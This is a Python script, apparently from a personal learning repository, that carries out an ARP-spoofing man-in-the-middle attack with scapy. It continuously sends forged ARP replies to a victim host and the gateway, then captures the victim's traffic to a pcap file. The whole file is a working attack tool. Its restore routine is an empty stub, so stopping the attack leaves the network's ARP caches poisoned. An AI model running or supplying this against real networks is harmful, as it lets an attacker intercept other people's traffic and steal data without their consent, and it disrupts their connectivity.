from multiprocessing import Process
from scapy.all import (ARP, Ether, 
                       conf, get_if_hwaddr, 
                       send, sniff, sndrcv, srp, wrpcap)
import os
import sys
import time

from linux_playground.utils.path_utils import specific_paths 


def get_mac_address(target_ip: str):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip), timeout=2)
    for _, target_answer in ans:
        return target_answer.src
             


class ArpController:
    def __init__(self, host, victim_target_ip: str, gateway_ip: str, interface='wlp3s0'):
        """
        :ivar host:
        """
        self.host = host
        self.victim_target_ip: str = victim_target_ip
        self.gateway_ip: str = gateway_ip
        self.interface = interface
        self.victim_mac: str = get_mac_address(self.victim_target_ip)
        self.gateway_mac = get_mac_address(self.gateway_ip)

    def run(self):
        # step 1 - poisoning
        self.poison_process = Process(target=self.poison)
        self.poison_process.start()

        # step 2 - sniffing
        self.sniff_process = Process(target=self.sniff)
        self.sniff_process.start()


    def poison(self):
        """
        Poisoning the victims by target ip address of the arper.
        high-level steps:
        1. create the poison packets.
        2. send them to the victim & gateway.
        
        ARP packet fields:
        - hwtype(16bit|4byte)
        - protocol type(16bit|4byte) IPv4 or IPv6
        - hwlen(8bit|2byte)
        - protocol length(8bit|2byte)
        - op - operation(1 or 2|16bit|2byte) - req or reply
        - hwst(32bit|4byte) - 00:00:00:00
        - pdst(32bit|4byte) - "x.y.z.w"
        - hwsrc(32bit|4byte) - 00:00:00:00
        - psrc(32bit|4byte) - "192.168.1.18"
        """
        # creates the ARP raw-skeleton packet
        poison_victim = ARP()
        poison_gateway = ARP()
        # ------------- create poison packets -----------------------# 
        # ------------- host -> victim ------------------------------#
        # operation 2 - replay sends from the gateway to the victim
        poison_victim.op = 2
        poison_victim.psrc = self.gateway_ip # ip source gateway 192.168.1.1
        poison_victim.pdst = self.victim_target_ip # ip destination target ip 192.168.1.27
        poison_victim.hwdst = self.victim_mac # hw destination target MAC A0:A0:A0:A0
        # and hwsrc is host MAC B0:B0:B0:B0
        # -------------- victim -> gateway ---------------------------#
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim_target_ip
        poison_gateway.pdst = self.gateway_ip
        poison_gateway.hwdst = self.gateway_mac

        print(f"begins the ARP poisoning")
        while True:
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt as keyboard_interrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)





        

    def sniff(self, count: int = 200):
        """
        Watch the attack in progress, by sniffing the network traffic.
        """
        time.sleep(5)
        print(f"Sniffing start: {count} packets")
        bpf_filter = f"ip host {self.victim_target_ip}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        # saves it as pcap file (bytes & read for programs like wireshark, etc...)
        wrpcap(specific_paths.relative_path('arper.pcap'), packets)
        print(f"got the packets")
        self.poison_process.terminate()
        self.sniff_process.terminate()


    def restore(self):
        pass


if __name__ == '__main__':
    target_mac_address = get_mac_address("192.168.1.27")
    arp_ctrl = ArpController(host="192.168.1.18", 
                             victim_target_ip="192.168.1.27", gateway_ip="192.168.1.1")
    arp_ctrl.run()
    arp_ctrl.poison_process.join()
    arp_ctrl.sniff_process.join()
    print("finished")
    print(f"finsihed")